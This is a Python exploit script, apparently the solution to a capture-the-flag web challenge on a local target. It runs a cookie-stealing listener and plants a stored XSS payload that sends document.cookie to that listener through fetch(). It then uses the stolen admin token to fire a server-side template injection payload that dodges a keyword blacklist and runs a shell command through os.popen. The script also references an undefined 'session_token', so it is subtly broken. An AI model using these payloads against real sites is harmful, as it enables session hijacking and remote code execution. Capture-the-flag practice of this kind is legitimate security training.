import requests
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import urllib.parse

# Configuration
# Configuration
TARGET_URL = "http://localhost:5005"
ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 8000
PAYLOAD_IP = "127.0.0.1"

# Global variable to store the stolen cookie
stolen_cookie = None

class CookieStealer(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_cookie
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if 'cookie' in params:
            stolen_cookie = params['cookie'][0]
            print(f"[+] Stolen Cookie: {stolen_cookie}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        return

def start_server():
    server = HTTPServer((ATTACKER_IP, ATTACKER_PORT), CookieStealer)
    print(f"[*] Attacker server started on {ATTACKER_IP}:{ATTACKER_PORT}")
    server.serve_forever()

def solve():
    global stolen_cookie
    
    # 1. Start the attacker server
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # 2. Register and Login
    print("[*] Registering user...")
    s = requests.Session()
    s.post(f"{TARGET_URL}/signup", data={'username': 'attacker', 'password': 'password'})
    print("[*] Logging in...")
    s.post(f"{TARGET_URL}/login", data={'username': 'attacker', 'password': 'password'})
    
    # 3. Post XSS payload
    print("[*] Posting XSS payload...")
    xss_payload = f"<script>fetch('http://{PAYLOAD_IP}:{ATTACKER_PORT}/?cookie='+document.cookie)</script>"
    s.post(f"{TARGET_URL}/guestbook", data={'comment': xss_payload})
    
    # 4. Wait for the bot to visit and send the cookie
    print("[*] Waiting for admin bot...")
    for _ in range(30):
        if stolen_cookie:
            break
        time.sleep(1)
    
    if not stolen_cookie:
        print("[-] Failed to steal cookie. Is the bot running?")
        return

    # Extract the admin token from the cookie string
    # Expected format: "admin_token=..."
    if "admin_token=" in stolen_cookie:
        admin_token = stolen_cookie.split("admin_token=")[1].split(";")[0]
    else:
        # Fallback if the whole string is the token (unlikely with document.cookie)
        admin_token = stolen_cookie
        pass

    print(f"[+] Admin Token: {admin_token}")
    
    # 5. Exploit SSTI
    print("[*] Exploiting SSTI...")
    cookies = {
        'admin_token': admin_token,
        'session': session_token
    }
    
    # Payload to read flag.txt
    # Payload to read flag.txt
    # Bypass blacklist: ['__', 'class', 'mro', 'subclasses', 'config', 'self', 'import', 'eval', 'popen', 'system']
    ssti_payload = "{{ (url_for|attr('\\x5f\\x5fglobals\\x5f\\x5f'))['os']|attr('po'+'pen')('cat flag.txt')|attr('read')() }}"
    
    params = {
        'search': ssti_payload
    }
    
    r = requests.get(f"{TARGET_URL}/admin_area/template_editor.php", params=params, cookies=cookies)
    
    if "L3m0n" in r.text:
        # Extract flag from the response (it will be in the search results)
        # The response will contain "Search Results for: L3m0n{...}"
        import re
        match = re.search(r'L3m0n\{.*?\}', r.text)
        if match:
            print(f"[+] Flag found: {match.group(0)}")
        else:
            print(f"[+] Flag potentially found in response:\n{r.text}")
    else:
        print("[-] Failed to get flag.")
        print(f"Response: {r.text}")

if __name__ == "__main__":
    solve()
